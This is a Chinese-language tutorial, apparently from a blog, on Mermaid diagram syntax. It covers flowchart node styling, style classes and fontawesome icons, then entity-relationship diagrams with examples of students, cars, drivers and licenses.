-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    <span class="title function_">id1</span><span class="params">(Start)</span>--&gt;<span class="title function_">id2</span><span class="params">(End)</span></span><br><span class="line">    style id1 fill:#0A0,stroke:#ff4,stroke-width:16px</span><br><span class="line">    style id2 fill:<span class="meta">#bbf,stroke:#f66,stroke-width:2px,color:#fff,stroke-dasharray: 5 5</span></span><br></pre></td></tr></table></figure>
-
-<p>实际上已经是层叠样式表css的范畴了</p>
-<table>
-<thead>
-<tr>
-<th>属性名称</th>
-<th>属性值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>fill</td>
-<td>节点内容的底色</td>
-</tr>
-<tr>
-<td>stroke</td>
-<td>外边框颜色</td>
-</tr>
-<tr>
-<td>stroke-width</td>
-<td>外边框宽度,单位像素</td>
-</tr>
-<tr>
-<td>color</td>
-<td>节点内容字体颜色</td>
-</tr>
-<tr>
-<td>stroke-dasharray</td>
-<td>外边框的边框虚实线</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    id1(Start)--&gt;id2(End)</span><br><span class="line">    style id1 fill:#0A0,stroke:#ff4,stroke-width:16px</span><br><span class="line">    style id2 fill:#bbf,stroke:#f66,stroke-width:2px,color:#fff,stroke-dasharray: 5 5</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="样式类"><a href="#样式类" class="headerlink" title="样式类:"></a>样式类:</h4><p>相当于设定一个固定的样式模板</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classDef &lt;样式类名&gt; 键1:值1,键2:值2...;</span><br></pre></td></tr></table></figure>
-
-<p>使用时将该模板应用于某个节点(子图也可以)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class &lt;节点索引1&gt;&lt;节点索引2&gt;... &lt;样式类名&gt;;</span><br><span class="line">or</span><br><span class="line">&lt;节点索引&gt;:::&lt;样式类名&gt;  %%注意中间有四个冒号</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	classDef 黄圈绿底黑字 fill:#<span class="number">0</span>A0,stroke:#ff4,stroke-width:<span class="number">16</span>px;%%声明一个样式类型</span><br><span class="line">	A((节点A));%%声明一个圆圈节点</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> 黄圈绿底黑字;</span>%%将刚才的样式类型应用于A</span><br><span class="line">	B[(数据库)];</span><br><span class="line">	classDef 数据库专用 fill:<span class="meta">#bbf,stroke:#f66,stroke-width:2px,color:#fff,stroke-dasharray: 5 5;</span></span><br><span class="line">	B:::数据库专用</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	classDef 黄圈绿底黑字 fill:#0A0,stroke:#ff4,stroke-width:16px;%%声明一个样式类型</span><br><span class="line">	A((节点A));%%声明一个圆圈节点</span><br><span class="line">	class A 黄圈绿底黑字;%%将刚才的样式类型应用于A</span><br><span class="line">	B[(数据库)];</span><br><span class="line">	classDef 数据库专用 fill:#bbf,stroke:#f66,stroke-width:2px,color:#fff,stroke-dasharray: 5 5;</span><br><span class="line">	B:::数据库专用</span><br></pre></td></tr></table></figure>
-
-<p>甚至多套上几圈可以造一个靶</p>
-<h4 id="默认类"><a href="#默认类" class="headerlink" title="默认类"></a>默认类</h4><p>如果声明一个叫做<code>default</code>的样式类,则所有没有手动分配样式类的节点都会自动使用default样式,子图也是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	classDef <span class="keyword">default</span> fill:#<span class="number">0</span>A0,stroke:#ff4,stroke-width:<span class="number">16</span>px;%%声明一个样式类型</span><br><span class="line">	A(( ))</span><br><span class="line">	subgraph sub [子图]</span><br><span class="line">		B((dot))</span><br><span class="line">	end</span><br><span class="line">	C[/绿的/]</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">	classDef default fill:#0A0,stroke:#ff4,stroke-width:16px;%%声明一个样式类型</span><br><span class="line">	A(( ))</span><br><span class="line">	subgraph sub [子图]</span><br><span class="line">		B((dot))</span><br><span class="line">	end</span><br><span class="line">	C[/绿的/]</span><br></pre></td></tr></table></figure>
-
-<h4 id="fontawesome"><a href="#fontawesome" class="headerlink" title="fontawesome"></a>fontawesome</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fa:#&lt;图表类名&gt;#</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">     E[<span class="string">&quot;fa:fa-ge&quot;</span> Imperial March!]</span><br><span class="line">     R[<span class="string">&quot;fa:fa-ra may the force be with you!&quot;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>星战的帝国和叛军竟然也被收录进了字体库,pornhub都没有这荣幸(可能是它图标太长了)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">     E[&quot;fa:fa-ge&quot; Imperial March!]</span><br><span class="line">     R[&quot;fa:fa-ra may the force be with you!&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">	L[&quot;fa:fa-linux&quot; linux]</span><br><span class="line">	W[&quot;fa:fa-windows&quot; windows]</span><br></pre></td></tr></table></figure>
-
-<h2 id="erDiagram"><a href="#erDiagram" class="headerlink" title="erDiagram"></a>erDiagram</h2><h3 id="信息世界基本概念"><a href="#信息世界基本概念" class="headerlink" title="信息世界基本概念"></a>信息世界基本概念</h3><p>实体关系模型:(ER模型)由实体类型及其之间的关系组成</p>
-<p>实体:客观存在并且可相互区分的事物</p>
-<blockquote>
-<p>比如具体的人,或者抽象的一次订货</p>
-</blockquote>
-<p>属性:实体的某一特性</p>
-<blockquote>
-<p>比如人的年龄,一次订货中的订货数量</p>
-<p>比如学生,学生的姓名学号年龄等都是学生实体的属性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">STUDENT&#123;</span><br><span class="line">	string name</span><br><span class="line">	int ID</span><br><span class="line">	char gender</span><br><span class="line">	int grade</span><br><span class="line">	int class</span><br><span class="line">	string TEL</span><br><span class="line">	int age</span><br><span class="line">&#125;	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<p>码:(key,键):唯一标识实体的属性集</p>
-<blockquote>
-<p>比如人的学号,一次订货的订单号</p>
-</blockquote>
-<p>实体型:用实体名及其属性名集合来抽象和刻画同类实体</p>
-<blockquote>
-<p>比如 用户(用户名,密码,VIP等级,账号等级)</p>
-</blockquote>
-<p>实体集:同一类型实体的集合</p>
-<blockquote>
-<p>比如全体用户</p>
-</blockquote>
-<p>联系:</p>
-<p>实体内部联系:一个实体的不同属性之间的关系</p>
-<p>实体间联系:不同实体集之间的联系</p>
-<h3 id="ER图"><a href="#ER图" class="headerlink" title="ER图"></a>ER图</h3><p>Entity-Relationship digram</p>
-<p>用来描述现实世界的概念模型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">    CUSTOMER ||--o&#123; ORDER : places</span><br><span class="line">    ORDER ||--|&#123; LINE-ITEM : contains</span><br><span class="line">    CUSTOMER &#125;|..|&#123; DELIVERY-ADDRESS : uses</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p>实体名约定俗成要大写</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;first-entity&gt; [&lt;relationship&gt; &lt;second-entity&gt; : &lt;relationship-label&gt;]</span><br></pre></td></tr></table></figure>
-
-<p>比如</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROPERTY ||--|&#123; ROOM : contains</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">PROPERTY ||--|&#123; ROOM : contains</span><br></pre></td></tr></table></figure>
-
-<p>mermaid将first-entity和second-entity都画成矩形框,表示实体,框里是实体名</p>
-<p>实体关系用<code>&lt;relationship&gt; </code>指定,在图上表现为关系连线上的字</p>
-<h4 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h4><p>这里的关系指的是ER图中实体间的外关系,不是一个实体的不同属性的内关系</p>
-<p>传统的ER图用菱形框表示关系</p>
-<p>比如这样表示学生和选课的多对多关系</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR;</span><br><span class="line">	S[学生]</span><br><span class="line">	C[课程]</span><br><span class="line">	R&#123;选课&#125;</span><br><span class="line">	S --n--- R --m--- C</span><br></pre></td></tr></table></figure>
-
-<p>在mermaid ER图中,不再使用菱形表示关系,而是用鱼尾纹连线</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;first-entity&gt; [&lt;relationship&gt; &lt;second-entity&gt; : &lt;relationship-label&gt;]</span><br></pre></td></tr></table></figure>
-
-<p>这里relationship就是关系,相当于传统模型的菱形框,</p>
-<p>relationship-label是关系描述,相当于原传统模型菱形框中的文字,如果多于一个单词则整个字符串用双引号包括,如果空则双引号空</p>
-<p>relationship可以细分成三部分,第一个实体相对于第二个实体的数量,第二个实体相对于第一个实体的数量,是否是子关系</p>
-<p>关于数量关系</p>
-<table>
-<thead>
-<tr>
-<th>Value (left)</th>
-<th>Value (right)</th>
-<th align="left">Meaning</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#96;</td>
-<td>o&#96;</td>
-<td align="left">&#96;o</td>
-</tr>
-<tr>
-<td>&#96;</td>
-<td></td>
-<td align="left">&#96;</td>
-</tr>
-<tr>
-<td><code>&#125;o</code></td>
-<td><code>o&#123;</code></td>
-<td align="left">Zero or more (no upper limit)</td>
-</tr>
-<tr>
-<td>&#96;}</td>
-<td>&#96;</td>
-<td align="left">&#96;</td>
-</tr>
-</tbody></table>
-<p>比如</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A||--|&#123;B</span><br></pre></td></tr></table></figure>
-
-<p>这就表示A对B是一对多关系</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">CAR &#125;|--|&#123; DRIVER : DRIVE</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">CAR &#125;|--|&#123; DRIVER : DRIVE</span><br></pre></td></tr></table></figure>
-
-<p>这个图就可以翻译为,一辆车可以被不同司机驾驶,一个司机可以驾驶不同车辆</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">DRIVER ||--|&#123; CAR : possess</span><br></pre></td></tr></table></figure>
-
-<p>这个图就可以翻译为,一个司机可以拥有多辆车,但是一辆车只能有一个主人</p>
-<p>如果在一个关系中,一个实体必须依附于其他实体才能存在,则这两个实体之间需要用实线连接</p>
-<p>如果在一个关系中,两个实体可以相互独立存在,则用虚线连接</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">CAR &#125;|--|&#123; DRIVER : DRIVE</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">CAR &#125;|--|&#123; DRIVER : DRIVE</span><br></pre></td></tr></table></figure>
-
-<p>没有驾驶员车也是存在的,车报废了驾驶员也是活着的</p>
-<p>但是对于驾驶证,没有驾驶员就没有他的证,没有证人就不是驾驶员</p>
-<p>一个驾驶员可以有多个驾驶证,A证B证C证</p>
-<p>一个普通人(比驾驶员限制宽松)就不一定需要有驾驶证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">DRIVER ||--|&#123; LICENSE : have</span><br><span class="line">PERSON |o..o&#123; LICENSE : have</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><p>传统的实体图,实体的属性使用椭圆表示的,用一根线连接到实体上</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/v2-8826929ae43cabf4f2525cc9392d719a_1440w.jpg" alt="img"></p>
-<p>而mermaid画的实体,规定属性的方式类似于类图</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">STUDENT &#123;</span><br><span class="line">	<span class="built_in">string</span> name</span><br><span class="line">	<span class="type">int</span> ID</span><br><span class="line">	<span class="type">char</span> gender</span><br><span class="line">	<span class="type">int</span> grade</span><br><span class="line">	<span class="type">int</span> <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">	<span class="title">string</span> <span class="title">TEL</span></span></span><br><span class="line"><span class="class">	<span class="title">int</span> <span class="title">age</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">erDiagram</span><br><span class="line">LICENSE&#123;</span><br><span class="line">	string LicenseID</span><br><span class="line">	string LicenseIssueDate</span><br><span class="line">	string DriverName</span><br><span class="line">	string DriverID</span><br><span class="line">	image Driveravatar</span><br><span class="line">&#125;</span><br><span class="line">DRIVER ||--|&#123; LICENSE : have</span><br><span class="line">PERSON |o..o&#123; LICENSE : have</span><br></pre></td></tr></table></figure>
-
-
-
 
       
     </div>
